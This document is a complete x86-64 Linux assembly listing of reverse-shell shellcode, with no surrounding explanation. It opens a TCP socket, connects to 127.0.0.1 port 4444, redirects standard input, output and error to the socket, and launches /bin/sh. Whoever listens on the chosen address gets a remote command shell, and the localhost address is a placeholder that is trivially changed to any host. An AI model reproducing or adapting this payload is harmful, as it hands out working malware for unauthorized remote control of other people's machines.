BITS 64
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi
    mov     dil, 2
    xor     rsi, rsi
    mov     sil, 1
    xor     rdx, rdx
    syscall
    mov     r12, rax

    ; connect(sockfd, {AF_INET, 4444, 127.0.0.1}, 16)
    xor     rax, rax
    push    rax
    mov     word  [rsp],   0x0002
    mov     word  [rsp+2], 0x5C11
    mov     dword [rsp+4], 0x0100007f
    mov     rsi, rsp
    mov     rax, 42
    mov     rdi, r12
    mov     rdx, 16
    syscall

    ; dup2(sockfd, 0/1/2)
    xor     rsi, rsi
dup_loop:
    xor     rax, rax
    mov     al, 33
    mov     rdi, r12
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     dup_loop

    ; execve("/bin//sh", NULL, NULL)
    xor     rax, rax
    push    rax
    mov     rbx, 0x68732F6E69622F2F
    push    rbx
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     al, 59
    syscall